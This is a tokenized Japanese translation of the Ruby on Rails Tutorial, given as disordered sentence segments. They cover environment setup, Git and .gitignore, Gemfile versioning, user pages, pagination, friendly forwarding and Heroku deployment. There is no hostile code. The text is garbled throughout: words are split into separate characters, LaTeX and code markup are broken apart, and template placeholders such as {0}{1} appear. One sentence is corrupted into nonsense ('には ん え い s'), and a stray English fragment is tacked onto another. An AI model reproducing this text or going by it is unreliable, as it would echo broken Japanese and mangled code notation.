▁( 演習 は \ href { http :// en . w ikipedia . org / wiki / B o s s _ ( video _ g am ing ) # M in i b o s s } { 中 ボ ス } です )。
▁さらに 、 Rails は 最新の Web テ ク ノ ロ ジ ー や フレームワーク 設計 に 素 早 く 適 応 しています 。
▁ チュートリアル が 統合 的に 構成 されている ことにより 、 本書 を 最 後 まで 完了 する ことができ れば 、 現 時点 の Web 開発 の 知 識 量 に 関 わ らず 、 より 高度な 情報 源 を 難 なく 読み こ な す 実 力 が 身 に つ き 、 上 に 挙 げ た JavaScript などの Rails 以外の トピック についても 理解 し や す く なります 。
▁ 言 い 換 え ると 、 本書 で 扱 う トピック の 範囲 が \ emph { 広 い } という ことで もあります 。 も し まだ 十分 な プログラミング 経験 を 持 っ ていない のであれば 、 その 情報 量 の 多 さ に 圧 倒 される かもしれません 。
▁ そこで 、 読者 の 経験 や 知 識 に 応 じ た 、\ emph { Rails チュートリアル } を 読 破 するための ア ド バ イ ス を 用 意 しました 。 ぜ ひ 参 考 に してください 。
▁ 「 最 初 から テストを 書 か ない と い け ない でしょう か ? 」 も 定 番 の 質 問 です 。
▁ そこで 、 も し テスト で 行 き 詰 ま って し ま った 場合には 、 そこで 長 々 と 悩 む よりも 思い 切 って ▁( 一 周 目 は ) ▁その 箇所 を スキップ し てしまい ましょう 。 より お勧め の 方法は 、 テストコード の 完全な 理解 については 欲 張 らず に 後 回 し に し 、 本書 のテスト は 自分の 書いた コード が正しく 動く かどうか の 検証 ツール と 割 り 切 って 使う ことです 。
▁Web プログラミング を まったく した こと の ない 初心者 の 方が 、 この \ emph { Rails チュートリアル } を 難 し すぎる と 感 じ た場合 は 、 本書 を学ぶ 前に まず HTML や CSS の基礎 を 勉 強 してください 。 それら の基礎 が 身 に つ い たら 、 是 非 もう一度 \ emph { Rails チュートリアル } に 挑 戦 してください 。
▁( HTML 関連 では これ といった お勧め の 教 材 は 思い つ か なかった のですが 、 「\ href { http :// head first la b s . com / books / h f html /}{ \ emph { H e ad ▁F ir st ▁ HTML } }」 は な か な か よ さ そう です 。 David ▁S a w y er ▁ M c F ar l and 著 「\ href { http :// www . a mazon . com / g p / product / 0 59 6 5 2 6 8 7 3 }{\ emph { CSS : ▁ The ▁ M is s ing ▁Ma n u al } }」 を 推 薦 してくれ た 読者 も います 。 )
▁P e ter ▁C oo per 著 「\ href { http :// www . a mazon . com / g p / product / 14 30 2 23 6 3 4 }{\ emph { B e g in n ing ▁Ruby } }」 の最初の 2 、 3 章 を や って み る の も よいでしょう 。 同 書 で 扱 っている サンプルアプリケーション は 、 本 格 的な Web アプリケーションに 比 べ て 非常に 小 さ い ので 、 比 較 的 や り やすい と思います 。
▁ただし 、 J a v a ▁ や ▁C / C + + ▁ といった 言語 と ▁Ruby ▁ 言語 では 、 記 法 が 異なる ので 、 少し 違 和 感 がある かもしれません 。 しかし 、 Ruby ▁ 言語 の 記 法 に 慣 れる まで に 、 そこ まで 時間 は か か り ません 。
▁( 例 えば 、 行 末 に セ ミ コ ロ ン を 書く 習慣 が つ い ている かもしれませんが 、 Ruby ▁ では 行 末 に セ ミ コ ロ ン を 置 いて も 問題 なく 動 きます 。 )
▁\ emph { Rails ▁ チュートリアル } では 、 覚 え ておく 必要 のある Web 特 有 の 概念 をすべて カ バー している ので 、\ text tt { POST } や \ text tt { PATCH } の違い が 分 から なくても 今 は 心 配 する必要はありません 。
▁ 本書 で カ バー する 基本的な 概念 については 既に 知 っている と思います が 、 テスト駆動開発 や REST 構造 などの 概念 については 馴 染 み がない 方 も いる でしょう 。
▁また 、 Ruby ▁ には 特 有 の ク セ が あるので 、 これ も 本書 で 初めて 触 れる 知 識 になる でしょう 。
▁ 読者 から の フィード バ ッ ク を 読 んだ 限 り では 、 そのような 方 であっても 本書 から 多くの ことを 学 べ る は ず だと 自 信 を 持 って 言 え ます 。
▁ 本書 には 、 そう した 方 々 が 初めて Rails を 学 んだ 頃 よりも 新しい 技術 が ふ んだ ん に 盛 り 込 まれ ている ため 、 本書 で 学ぶ 技術 は き っ と 役 に 立 つ はずです 。
▁最後に 、\ emph { Ruby ▁on ▁Rails チュートリアル } を 読み 終 え た 経験 豊 富 な プ ログ ラ マ の 方 には 、 さらに 高度な 話 題 を 扱 っている 「\ href { http :// www . a mazon . com / g p / product / 19 3 3 9 88 6 5 7 }{\ emph { The ▁We ll - G r ound ed ▁Ruby ist } } 」( David ▁A . ▁B l ack ▁ 著 ) ▁ または 「\ href { http :// www . a mazon . com / E lo que n t - Ruby - A d d is on - W es le y - Pro f ess ion al - S er ies / d p / 0 3 2 15 8 4 10 4 /}{ \ emph { E lo que n t ▁Ruby } } 」( R us s ▁ O l s en ▁ 著 ) ▁ を お勧め します 。 あるいは 、 トピック 別 に 書かれてい る 「\ href { http :// www . a mazon . com / g p / product / 06 7 23 2 88 4 4 }{\ emph { The ▁Ruby ▁ W a y } } 」( H al ▁F ul to n ▁ 著 ) ▁ を 読んで み る の も 良い でしょう 。
▁ 本 節 を 続 け る 前に 、 一 旦 ここで 、 初期 の 頃 から ▁Rails ▁ フレームワーク に対して 指 摘 され ていた 「 Rails ▁ は ス ケ ー ル できない 」 という 主 張 について 触 れ たい と思います 。 す な わ ち 、「 Rails ▁ では 大 量 の ト ラ フ ィ ッ ク を 捌 く < n > ことができ ない 」 という 主 張 です 。
▁この 主 張 の一部 には 、 間 違 った 認 識 があります 。 それ は 、\ href { http :// id le process . word pre s s . com / 200 9 / 11 / 2 4 / present ation - sum m ary - h ig h - perform an ce - at - ma s s ive - sc al e - less on s - learn ed - at - fa ce book /}{ あなた が \ emph { Web サイト } を ス ケ ー ル させる ので あって 、 フレームワーク が Web サイト を ス ケ ー ル させる の では ない } 、 ということです 。 Rails ▁ は 素晴らしい フレームワーク では あります が 、 しかし 、 ただ の フレームワーク で しか ありません 。
▁ したがって 、 本 来 のある べ き 問 い は 「 Rails ▁ で 構 築 された Web サイト は ス ケ ー ル できる のか ? 」 となります 。
▁ そして 、 今 と な って は 、 この 主 張 の 答 え は 明 白 です 。 な ぜ なら 、 世界 で 最も ト ラ フ ィ ッ ク の 大 き い Web サイトの いくつか は 、 Rails ▁ で 構 築 されている からです 。
▁ただし 、 Web サイト を ス ケ ー ル \ emph { させる } ことは 、 Rails ▁ だけで 出 来 ること ではありません 。 Rails ▁ 以外の 知 識 も 必要 になります 。 と い って も 、 H ul u ▁ や ▁ Y e ll o w ▁P age s ▁ といった 大 量 の ト ラ フ ィ ッ ク を 捌 い ている Web アプリケーション も ▁Rails ▁ で 構 築 されている ので 、 そこ まで 心 配 する必要はありません 。 少なくとも 、\ emph { あなた の } アプリケーション が ▁ H ul u ▁ や ▁ Y e ll o w ▁P age s ▁ 並 み に 成 長 する まで の 間 は 、「 Rails ▁ だ から ス ケ ー ル できない 」 ということ には な らない でしょう 。
▁\ emph { Rails チュートリアル } を 読んで いて 、 チュートリアル 内部 の 別 セクション 番号 へのリンク をクリックして 移動 した ら 、 なるべく すぐ に 元の 場所 に 戻 る ことをお勧めします 。
▁Web ページ で 読んで いる 場合は 、 ブラウザ の ▁[ 戻 る ] ▁ ボタン で 戻 れ ます 。 A do b e ▁ Re ad er や OS ▁X の プレビュー で P D F 版 を 読んで いる 場合 でも 、 同様に 戻 る 方法 があります 。
▁A do b e ▁ Re ad er の場合は 、 ドキュメント 画面 を 右 クリック して ▁[ P re v io us ▁ View ] を クリック します 。
▁ OS ▁X ▁P re view の場合は メニュー の ▁\ text tt { [ 移動 ] ▁ > ▁[ 戻 る ]} ▁ で 戻 れ ます 。
▁\ ko de { s u do } コマンド を実行すると デフォルトで root ▁( ス ー パ ー ユーザー ) ▁ に 切り 替 わ るため か 、 多くの 人 が s u do コマンド を ▁" s up er user ▁do " ▁ の 略 だと 誤 って 信 じ ています 。
▁ 正しく は 、\ ko de { s u do } は \ ko de { s u } コマンド と 英語 の ▁“ do ” ▁ を つ な げ た ものです 。 そして \ ko de { s u } コマンド は ▁“ sub st it u te ▁ user ” ▁( ユーザーの 切 替 ) ▁ の 略 な のです 。 ターミナル で \ ko de { ma n ▁ s u } と 入力 すれば この ことを確認 できます 。
▁ 語 源 学 の 示す ところ に よ れば ▁“ S O O - do o ” ▁ と 発 音 します が ▁( “ do ” ▁ は ▁“ do o ” ▁ と 発 音 する ので ) 、 “ S O O - do h ” ▁という 発 音 も よく 使われ ます 。
▁なお 、 Windows の コマンド プロンプト では 、 ディレクトリ の 区切 り は 次のように バ ッ ク ス ラ ッ シ ュ または 円 マーク で 表示 されます 。
▁C : \ S it es \ sample _ app
▁この 点 を 明 確 にする ため 、\ emph { Rails チュートリアル } では 、「 Rails ルート 」 については \ emph { ( Rails で作成した ) Web アプリケーションの ルート ディレクトリ } を指す もの とします 。 また 、 すべての ディレクトリ は 、 この ルート ディレクトリ を 起 点 と した 相 対 パス で 示 します 。
▁たとえば 、 著者 の サンプルアプリケーションの ▁\ ko de { config } ▁ ディレクトリ は 、 次の 場所 に あります 。
▁このとき 、 この Rails アプリケーションの ルート ディレクトリ は 、\ ko de { config } ディレクトリ の 1 つ 上の 階層 に あります 。 したがって 、 以下の 場所 が ルート ディレクトリ になります 。
▁ 長 い パス を 毎 回 表 記 すると 読み づ ら くなる ので 、 本書 では 以下のような ディレクトリ パス を参照 する 場合 、
▁ アプリケーションの ルート パス を省略 して 、 単 純 に \ ko de { config / routes . rb } と 表 記 する ことにします 。
▁# ▁gem ▁' the ruby r a c er ', ▁ p l at form s : ▁: ruby
▁# ▁ Re ad ▁more : ▁ https :// github . com / rails / turbolinks
▁# ▁ U s e ▁ un i c or n ▁as ▁the ▁app ▁ server
▁# ▁ U s e ▁ debug g er
▁# ▁gem ▁' debug g er ', ▁ group : ▁ [: development , ▁: test ]
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁以下の 構 文 を実行すると
▁\ ko de { ug li fi er } のバージョン が \ ko de { 1 . 3.0 } 以上 であれば 最 新 バージョンの gem が インストール されます 。 ▁ 極 端 に 言 えば バージョン が \ ko de { 7 . 2 } であっても それ が 最 新 なら インストール されます 。 なお 、 ug li fi er は Asset ▁Pipeline で ファイル 圧 縮 を行う ためのものです 。
▁ 一方 、 例 えば 、 以下のコード を実行すると
▁\ ko de { coffee - rails } ▁( これ も Asset ▁Pipeline で使用する gem です ) ▁ のバージョン が \ ko de { 4 . 0.0 } より 大きく 、\ ko de { 4.1 } より 小 さ い 場合に インストール する ようになります 。
▁ 経験 上 、 残念ながら マ イ ナ ー アップグレード です ら 問題 を 引 き 起 こ す ことがあります 。 このため 、\ emph { Rails チュートリアル } では 基本的に すべての gem で バージョン を ピ ン ポ イン ト で 指定 しています 。
▁なお 、\ ko de { install } は 省略 可能です 。
▁ 実は 、\ ko de { bundle } コマンド は \ ko de { bundle ▁install } の エイリアス で もあります 。
▁=> ▁Rails ▁ application ▁ start ing ▁on ▁ http :// 0.0 . 0.0 : 3 000
▁ プロジェクト を開く
▁$ ▁< エディタ 名 > ▁ .
▁$ ▁ sub l ▁ .
▁(\ ko de { v im } という コマンド 名 は 、 使用している 「 フ レ ー バー 」 によって は \ ko de { g v im } や \ ko de { m v im } など になっている ことがあります 。 )
▁ 手順 の最後 として 、 Git の コミット メッセージ を入力する ときに 使用する エディタ を 設定 できます 。
▁S ublime ▁Text 、 T ext M at e 、 g V im 、 Mac V im などの G U I エディタ を使用する場合 、 シ ェ ル から 離 れ ず シ ェ ル 内で 起動 する よう フラグ を 付け てください
▁ G U I エディタ の 起動 後 も ターミナル を使用し 続 け ること は できます 。 ただし 、 Git は デ タ ッ チ 時に コミット メッセージ が 空 の ま ま ファイルを 閉 じ た と み な す ため 、 コミット は 中 断 されます 。
▁ Git の エディタ オプション で \ ko de { sub l } や \ ko de { g v im } に フラグ を 付け ない と 、 この あ たり の動作 で 頭 が 混 乱 する かもしれません ▁( 訳 注 : ▁git の エディタ 設定 は G U I エディタ と あ まり 相 性 が よく ない ら しく 、 v im や n an o のような コマンド ベース の エディタ を 選択 する の が 無 難 な よう です )。
▁この 注 釈 の 意味 が よく わ から ない場合は 、 無視 しても 構 いません 。
▁\ ko de { " sub l ▁- w "} ▁ の 部分 は 、 T ext M at e の場合は ▁\ ko de { " ma te ▁- w "} 、 g V im の場合は \ ko de { " g v im ▁- f "} 、 Mac V im の場合は \ ko de { " m v im ▁- f "} ▁ に それぞれ 置き換え ます 。
▁ここで 1 つ 問題 があります 。 Git は \ emph { すべての } ファイルの 変更 履 歴 を 管理 する ようになっています が 、 管理 対象 に含め たくない ファイル もあります 。
▁たとえば 、 Rails によって 作成される ログ ファイルは 頻繁に 内容 が 変わる ので 、 い ち い ち バージョン管理 に 更新 させ た く ありません 。
▁ Git には こういった ファイルを 管理 対象 から 除 外 する 機能 があります 。 \ ko de { . gitignore } という ファイルを アプリケーションの ルート ディレクトリ に置き 、 除 外 したい ファイル を指定する ための ルール を そこ に 記 載 します
▁\ ko de { . gitignore } が ディレクトリ に 見 当 たら ない場合は 、 ファイル ブラウザ や エ ク ス プロ ー ラ で 隠 し ファイル を表示する よう 設定 を変更する 必要がある かもしれません 。
▁self を省略した 結果を リスト \ ref { code : default _ gitignore } に示します 。
▁\ ko de { rails } コマンドで 作成される デフォルトの \ ko de { . gitignore } ファイル の内容 。
▁# ▁S e e ▁ http :// help . github . com / ig no re - file s / ▁for ▁more ▁ about ▁ ig n or ing ▁ file s .
▁# ▁I f ▁you ▁ find ▁your self ▁ ig n or ing ▁ te m p or ary ▁ file s ▁ generated ▁ by ▁your ▁ text ▁ edit or
▁# ▁ or ▁ o per at ing ▁ s y st e m , ▁you ▁ pro b a b ly ▁ w an t ▁to ▁ add ▁a ▁ g lo b al ▁ ig no re ▁in st e ad :
▁# ▁git ▁config ▁-- g lo b al ▁ core . ex c l u de s file ▁' ~ / . gitignore _ g lo b al '
▁# ▁I g no re ▁bundle r ▁config .
▁ / . bundle
▁# ▁I g no re ▁the ▁ default ▁ SQLite ▁ database .
▁ / db / * . sqlite 3
▁ / db / * . sqlite 3 - j our n al
▁# ▁I g no re ▁ all ▁ log file s ▁and ▁ te m p file s .
▁ / log / * . log
▁これらの ファイルは 頻繁に 更新 される ため 、 バージョン管理 に含め る のは 何か と 不 便 です 。
▁さらに 、 他の 開発者 と 共 同 作業 を行う 場合に このような ファイルを バージョン管理 に含め ると 無 用 な 衝 突 ▁( con f li ct ) ▁ が発生し 、 関係 者 一 同 が 無 用の スト レ ス に さ ら される こと になり か ね ません 。
▁この \ ko de { . gitignore } では 、 Rails ドキュメント ファイル 、 V im や E ma c s の ス ワ ッ プ ファイル 、 そして OS ▁X ユーザー には お 馴 染 み の 、 あ の い ま い ま しい \ ko de { . D S _ S to re } ディレクトリ ▁( Mac の F i nder 操作 で 作成される 隠 し ディレクトリ ) ▁ も 管理 対象 から 除 外 されます 。
▁ より 多くの パターン を 除 外 する \ ko de { . gitignore } ファイル 。
▁# ▁I g no re ▁ other ▁ un n e ed ed ▁ file s .
▁* . s w p
▁ . pro j e ct
▁D S _ S to re
▁ . id e a
▁ . secret
▁最後に 、 新しく 作成した Rails プロジェクト の ファイルを Git に追加 し 、 次に それ を コミット します 。
▁ ファイル を追加する ▁(\ ko de { . gitignore } で 指定 されている もの を 除 く ) ▁ には 、 以下のコマンドを実行し ます 。
▁ 上で 述 べ た ように 、\ ko de { git ▁ branch ▁- D } で トピックブランチ 上の 変更を 破 棄 することもできます 。
▁ 更新 した \ ko de { Gemfile } を \ ref { code : gemfile _ p g _ gem } に示します 。
▁# ruby - gem set = railstutorial _ rails _4_0
▁( 著者 の場合 、 RVM の gem set も 次の 行 で 指定 しています 。
▁たとえば Ruby ▁\ ko de { ’ 1 . 9 . 3 ’ } を 使用している のであれば 、 その バージョン 番号 に 書き 換 え てください 。 本書 で の 指定 とは 若 干 異なる ことになります が 、 この 変更 は 問題 ありません )。
▁ 追加 の gem を 含 んだ \ ko de { Gemfile } 。
▁{0}{1} リスト 1 . 14 {/1}{/0} で 追加 した gem は 本番環境で しか 使用 し ないので 、 この フラグ を追加した コマンド を実行すると 本番 用 gem は ローカル に追加 されません 。 今 この コマンド を実行する のは 、 後 の 本番環境 への デプロイ に 備 え て \ ko de { Gemfile . lock } を更新し 、\ text tt { p g } ▁gem と \ text tt { rails _ 12 factor } ▁gem 、 Ruby バージョンの 指定 を Gemfile . lock には ん え い s 必要がある ためです 。
▁ ここ まで の 進 捗 を Twitter に 投 稿 したり F a ce book で 通知 するには 以下の リンク から どう ぞ 。
▁ プロフィール画面 ▁(\ href { http ://0.0.0.0:3000/ users / 2 }{/ users / 2 }) ▁ に ▁[ Follow ] ▁ ボタン が表示されている
▁{0} 図 1 2.1 3 {/0} ▁{1} プロフィール画面 ▁(\ href { http ://0.0.0.0:3000/ users / 5 }{/ users / 5 }) ▁ に ▁[ U n follow ] ▁ ボタン が表示されている {/1}
▁次に 、 すべての ユーザーを 一覧 できるようにします ▁( もちろん 認 証 を 要求 します )。 これは サンプルデータ と ページネーション ▁( p a g n ation ) ▁ を 導入 する 動 機 にも なります 。
▁ before フィルター を使って 実装 した 結果 ▁( リスト \ ref { code : author ize _ before _ filter }) ▁ は 、 一度 ログアウト して ユーザー 編集 ページ ▁(\ href { http ://0.0.0.0:3000/ users /1/ edit }{/ users /1/ edit }) ▁ にアクセス してみる ことで 確認 できます ▁( 図 \ ref { fig : protected _ log _ in })。
▁self を省略した 結果を リスト \ ref { code : fixture _ sec on d _ user } に示します 。
▁ フ ォ ワ ー デ ィ ング 自体 を実装する には 、\ ko de { redirect _ b ack _ or } メソッド を使用します 。 リクエスト された URL が存在する 場合は そこ に リダイレクト し 、 ない場合は 何らかの デフォルトの URL に リダイレクト します 。 デフォルトの URL は 、 Session コントローラの \ ko de { create } アクション に追加 し 、 サインイン 成功 後に リダイレクト します ▁( リスト \ ref { code : friend ly _ session _ create })。
▁このコードは 、 値が \ ko de { nil } で なければ \ ko de { session [: forwarding _ url ]} を 評価 し 、 nil であれば 与えられた デフォルトの URL を使用します
▁リスト \ ref { code : friend ly _ forwarding _ code } では 、 session . delete (: forwarding _ url ) ▁という 式 を通して 転 送 用の URL を削除し ている 点に注意 してください 。 これを や って お か ない と 、 次 回 ログイン したときに 保 護 された ページに 転 送 され てしまい 、 ブラウザを閉じ る まで これ が 繰 り 返 され てしまいます
▁{0} 図 11 . 7 {/0} ▁{1} ユーザー プロフィール ▁(\ href { http ://0.0.0.0:3000/ users /1 }{/ users /1 }) ▁ と マイクロポスト {/1}
▁{0} 図 11 . 8 {/0} ▁{1} 別 ユーザーの プロフィール と マイクロポスト ▁(\ href { http ://0.0.0.0:3000/ users / 5 }{/ users / 5 }) {/1}
▁ まず 、\ emph { Gemfile } に \ ko de { F a k er } ▁gem を追加します ▁( リスト \ ref { code : fa k er _ gemfile })。 これは 、 実際に あり そう な ユーザー名 と メールアドレス を持つ サンプル ユーザーを 自動的に 作成する ものです 。
▁\ ko de { Gemfile } に F a k er を追加する
▁ 更新 した \ ko de { Gemfile } を リスト \ ref { code : will _ paginate _ gem } に示します 。
▁\ text tt { Gemfile } に \ ko de { will _ paginate } を追加する
▁ Home ページ ▁(\ href { http ://0.0.0.0:3000/ }{/ }) ▁ に マイクロポストの 投 稿 フォーム を追加する
▁[ \ href { http ://0.0.0.0:3000/ users ? page = 2 } {2} ] ▁ リンク または ▁[ \ href { http ://0.0.0.0:3000/ users ? page = 2 } { N ext } ] ▁ リンクをクリックすると 、 図 \ ref { fig : user _ index _ page _ two _ rails _ 3 } のように 次の ページ に移動し ます 。
▁self を省略した 結果を リスト \ ref { code : users _ fixtures _ ext r a _ users } に示します 。
▁Rails は \ ko de {@ users } を \ ko de { User } オブジェクトの リスト である と 推測 します 。 さらに 、 ユーザーの コレクション を与えて 呼 び 出 す と 、 Rails は自動的に ユーザーの コレクション を 列 挙 し 、 それぞれの ユーザーを \ ko de { _ user . html . erb } パーシャル で 出力 します ▁( 訳 注 : ▁ each ▁do と end で 囲 む 必要 が なくなります )。
▁ 図 \ ref { fig : home _ with _ form } の フォーム が正しく 動作 している かどうかを確認 したい場合 、 正しい エ ン ト リ ー を 投 稿 した 後 、\ href { http ://0.0.0.0:3000/ users /1 } { プロフィール ページ } に移動し て ポ スト を 表示 すれば よい のですが 、 これは かなり 面倒 な 作業 です 。
▁ このような 危 険 がある から こ そ 、 編集 しても よい 属性 だけ を 許可 する ように 処理 された パラメータ を 渡す ことが 重要 になります 。
▁self を省略した 結果を リスト \ ref { code : action _ tests _ admin } に示します 。
▁\ ko de { render ▁@ users } を実行すると 、 自動的に \ ko de { _ user . html . erb } パーシャル を参照 し 、 各 ユーザーを コレクション として 表示する
▁\ emph { ヒント : } ▁Web を 検索 してみましょう 。 この 目的 に う って つ け の 堅牢 な メソッドが 見つか る はずです 。 \ ko de { _ blank } という 文字 も 一 緒 に 検索 してみてください 。
▁リスト { p 0} の パーシャル を使用して 、 {2} new . html . erb {/2} ビュー と {2} edit . html . erb {/2} ビュー を リファクタリング し 、 コードの 重複 を 取り 除 い てください 。
▁このとき 、 リスト { p 0} のように フォーム 変数 {2} f {/2} を 明示的に ローカル変数 として 渡す 必要がある ことに注意してください 。 また 、 pro v id e 関数 を使うと 、 パーシャル 化 した new フォーム や edit フォームの 重複 を さらに 取り 除 く ことも 可能です ▁( J o s e ▁C ar lo s ▁Mon ter o ▁ G ó me z の 指 摘 に 感 謝 します )。
▁ サインイン した ユーザー は 、 も は や Users コントローラの \ ko de { new } アクション や ▁\ ko de { create } アクション にアクセス する必要はありません 。
▁ サインイン した ユーザーが これらの アクション を ブラウザで 開 こう と した ら 、 ルート URL に リダイレクト するようにしてください 。
▁\ ko de { destroy } アクション を 改 造 し 、 管理者 が 自分自身 を 削除 できない ように してください 。
▁( 最初に テスト を作成して から に してください 。 )
▁ new フォーム と edit フォームの フィールド に 使用する パーシャル 。
▁< script ▁src =" http :// html 5 sh im . g oo g le code . com / s v n / tr un k / html 5 . js " ></ script >
▁< script ▁src =" http :// html 5 sh im . g oo g le code . com / s v n / tr un k / html 5 . js " ></ script >
▁ 注 : ▁ 以前の バージョンの Rails では 、\ ko de { rails . png } という ロ ゴ マーク が自動的に すべての Rails プロジェクト に インストール していました が 、 最 新 バージョンの Rails では \ ko de { rails ▁ new } による 生成 時に この ロ ゴ マーク を含め なく なりました 。 この ロ ゴ マーク が 必要な 方は 、 Ruby ▁on ▁Rails 公式 ページ ▁(\ href { http :// rubyonrails . org / images / rails . png } { http :// rubyonrails . org / images / rails . png }) ▁ から ダウンロード して \ ko de { app / assets / images / } ディレクトリ に おいてください
▁\ ko de { header } タグ に \ ko de { n a v bar - fi x ed - to p } クラス が与えられ ている ので 、 これ に従って Bootstrap は ナビゲーション バー を ページ 上 部 に 固定 し 、 ナビゲーション バー の下に 余 白 を 置 いて 主 要 部分 から 分 離 します
▁この 行 では 、\ ko de { app / views / layouts / _ sh im . html . erb } という ファイル を探し て その 内容 を 評価 し 、 結果を ビュー に 挿 入 しています
▁ ここ まで く れば 、 ファイル名 は \ ko de { _ footer . html . erb } で 、 layouts ディレクトリ ▁( リスト \ ref { code : footer _ partial }) ▁ に 置 け ば よい ということ が わ か る と思います
▁ ビュー そのもの は 1 ページ のコード ですが 、 サイトの データベースから 取り出し た 情報 を使用して 各 プロファイル の 表示 を カスタマイズ します 。
▁ ローカル の Rails サーバー では console の デフォルトの 環境 として \ text tt { development } が使用されます が 、 以下のように 他の 環境で console を実行する こともできます 。
▁ ユーザー表示ページ 用の テスト 。
▁ユーザー を表示する ために 、 標準的な Rails の 場所 を使用する ことにします 。 \ ko de { app / views / users / show . html . erb } です 。
▁リスト { p 0} で ジェネレータ を使用して 作成した {2} new . html . erb {/2} ビュー と異なり 、 この {2} show . html . erb {/2} ファイル は自動的に は 作成 され ないので 、 手動で 作成 します 。 この ファイルを 作成 後 、 リスト \ ref { code : st ub _ user _ view } の内容 を 貼 り 付け てください 。
▁1 番目の とき と同様 、\ ko de { generate } を実行して 、 現 時点 で の 要求 である 新規ユーザー 用の サインアップ ページ ▁( ス タブ ) ▁ を持つ 、 最も 簡単な コントローラ を作成します 。
▁ Users コントローラに リクエスト が 正常に 送信 される と 、\ ko de { params [: id ]} の 部分 は ユーザー id の \ text tt {1} に置き 換 わ ります 。 従って 、 この 箇所 は 以下の \ ko de { find } メソッドと 同 等 です 。
▁ユーザーの ビュー と アクション が 定義された ので 、 URL ▁\ href { http ://0.0.0.0:3000/ users /1 }{/ users /1 } ▁ は 完全に 動作する ようになりました ▁( 図 \ ref { fig : user _ show _ rails })。
▁ 図 \ ref { fig : user _ show _ rails } の デバッグ情報 で \ ko de { params [: id ]} の 値を 確認 できる ことに も 注目してください 。
▁ アプリケーションで カスタム Gravatar を 利用 できるように するために 、\ ko de { update _ attributes } ▁(\ ref { sec : updating _ user _ objects }) ▁ を使用して データベース 上の ユーザー情報 を更新し ます 。
▁{0} 図 7 . 10 {/0} ▁{1} 現 状 の ユーザー登録ページ ▁\ href { http ://0.0.0.0:3000/ signup }{/ signup }{/1}
▁ 最も 簡単な 方法は 、 Rake の \ ko de { db : reset } タスク を実行して データベース を リセット することです 。
▁ システム 環境 によって は 、 データベース を リセット した 後に もう一度 prepare を実行し ておく 必要 が 生じる ことがあります 。
▁最後に 、 システム によって は 変更を 反 映 するために ターミナル で \ text tt { Ctrl - C } を 押 して Web サーバーを再起動 する必要が 生じる こともあります
▁Rails は 、\ ko de { form _ for (@ user ) } を使用して フォーム を構成する と 、\ ko de {@ user . new _ record ?} が \ ko de { true } のとき には \ text tt { POST } を 、\ ko de { false } のとき には \ text tt { PATCH } を使用します 。
▁Rails は これらの \ ko de { name } の値 を使用して 、 初期化 ハッシュ を ▁(\ ko de { params } 変数 経由で ) ▁ 構成 します 。 この ハッシュ は 、 ユーザーが 入力 した 値 に基づいて ユーザー を作成する とき ▁(\ ref { sec : unsuccessful _ signup s }) ▁ に 使用されます 。
▁ ユーザー登録 の 失敗 に 対応 できる \ ko de { create } アクション 。
▁ / users /1 のような URL の場合 、\ ko de { params [: id ]} の値 は 該当する ユーザーの \ ko de { id } ▁( この 例 では \ ko de {1} ) ▁ になります 。
▁最後に 、 リファクタリング では あります が 、 一般的な 慣習 に 倣 って \ ko de { current _ user ?} という 論理値 を返す メソッドを 実装します 。 \ ko de { correct _ user } の中で 使えるように したい ので 、 Sessions ヘルパー の中に このメソッド を追加します ▁( リスト \ ref { code : current _ user _ p })。
▁このコードは たとえば \ ko de { " 0 ▁ errors " }、\ ko de { " 1 ▁ error " }、\ ko de { " 2 ▁ errors "} などの ように 、 エラー の 数 に応じて 活用 された 単 語 を返します 。 これにより 、\ ko de { " 1 ▁ errors "} のような 英語 の 文法 に 合 わ ない 文字列 を避ける 事 が できます 。 ▁( a ▁d ist r ess ing ly ▁ com m on ▁ m ist a ke ▁on ▁\ href { http :// www . u rb and i c tion ary . com / de f in e . ph p ? ter m = in ter web s } { te h ▁in ter web s }) .
▁さらに Rails は 、 エラー ページ にある 、\ ko de { div } で 囲 まれ た エラー CSS クラス \ ko de { field _ with _ errors } を 適 用 しています 。
▁また 、 ▁\ ko de { assert _ no _ difference } メソッドの ブロック 内で \ ko de { post } 関数 を 使い 、 メソッドの 引数に は \ ko de { ’ User . count ’ } を与えて います 。 これは 、 ▁\ ko de { assert _ no _ difference } の ブロック を実行する 前 後 で 引数 の値 ▁(\ ko de { User . count }) ▁ が 変 わ らない ことを テスト しています 。
▁ 先ほど 定義 した \ ko de { store _ location } メソッドを使って 、 早 速 before フィルター の \ ko de { logged _ in _ user } を 修正 してみます ▁( リスト \ ref { code : add _ store _ location })。
▁ ユーザー登録フォーム を 完成 させる ために 、 リスト \ ref { code : first _ create _ action } の コメントアウト された 部分 に コードを 書き 、 適切に 動作する ように しましょう 。
▁ 適 用 する CSS クラス を メッセージ の 種類 によって 変更 する ようにしています 。 これにより 、 たとえば \ ko de { : success } キー の メッセージ が表示される 場合 、 適 用 される CSS クラス は 次の ようになります 。
▁\ ko de { assert _ no _ difference } と同様に 、 このメソッドは 第 一 引数に 文字列 ▁(\ ko de { ’ User . count ’ }) ▁ を 取り 、\ ko de { assert _ difference } ブロック 内の 処理 を実行する 直 前 と 、 実行 した 直 後 の \ ko de { User . count } の 値を 比 較 します 。
▁この テストが パス するために は 、 User の ルート ( リスト \ ref { code : users _ resource }) と User の ▁\ ko de { show } アクション ( リスト \ ref { code : user _ show _ action }) 、 そして \ ko de { show . html . erb } ビュー ( リスト \ ref { code : user _ show _ view _ with _ gravatar }) が それぞれ 正しく 動 い ている 必要があります 。
▁ そして SSL を 有効化 する の も 簡単 です 。 ▁\ ko de { production . rb } という 本番環境 の設定 ファイルの 1 行 を修正する だけで 済み ます 。
▁ 本番 Web サイト が 動作 するために 、 設定 ファイルの 変更を コミット して Heroku に プッシュ する必要があります 。
▁次に 、 本番 データベース で マイグレーション を実行し 、 Heroku に User データモデル を使用すること を 通知 します 。
▁ 結果 として 、\ ref { sec : un i c or n _ in _ production } で アプリケーションの デプロイ が 終 わ ると 、 自動的に SSL が 有効化 されている はずです 。 , ▁ SSL ▁ will ▁ auto ma tic all y ▁be ▁ en able d .
▁self を省略した 結果を リスト \ ref { code : un i c or n _ gemfile } に示します 。
▁ Bundler では 本番環境 用の gem は インストール しない 設定 に して お いた ので ▁(\ ref { sec : sample _ app _ setup }) 、 リスト \ ref { code : un i c or n _ config } は 開発環境 に 影 響 はありません 。 しかし 、 Bundler に \ ko de { Gemfile . lock } を更新し ても ら う 必要がある ので 、 いつものように 次の コマンド を 実行 しておきます 。
